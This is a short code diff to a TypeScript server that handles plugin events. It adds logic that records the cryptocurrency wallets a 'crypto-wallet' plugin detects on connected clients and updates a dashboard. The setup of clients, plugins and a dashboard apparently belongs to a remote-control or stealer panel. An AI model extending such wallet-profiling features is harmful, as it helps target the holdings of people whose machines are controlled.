@@ -8,6 +8,7 @@ import { encodeMessage } from "../protocol";
 import * as sessionManager from "../sessions/sessionManager";
 import type { SocketData } from "../sessions/types";
 import { deliverWebPushClientEvent } from "./notification-delivery";
+import { setCryptoWallets } from "../db";
 
 type NotificationRecord = {
   id: string;
@@ -404,6 +405,17 @@ export function createNotificationPluginHandlers(deps: CreateDeps) {
         if (pluginId) {
           deps.pluginState.lastError[pluginId] = error || String((payload as any).message || "plugin error");
           void deps.savePluginState();
+        }
+      }
+      // Persist crypto wallet detection results to the client record
+      if (pluginId === "crypto-wallet" && event === "wallets_detected") {
+        try {
+          const wallets: { name: string }[] = (eventPayload as any)?.wallets ?? [];
+          const names = wallets.map((w) => w.name);
+          setCryptoWallets(clientId, names);
+          sessionManager.notifyDashboardViewers();
+        } catch (e) {
+          logger.warn(`[crypto-wallet] failed to persist wallets for ${clientId}: ${e}`);
         }
       }
       // Buffer all events for UI polling
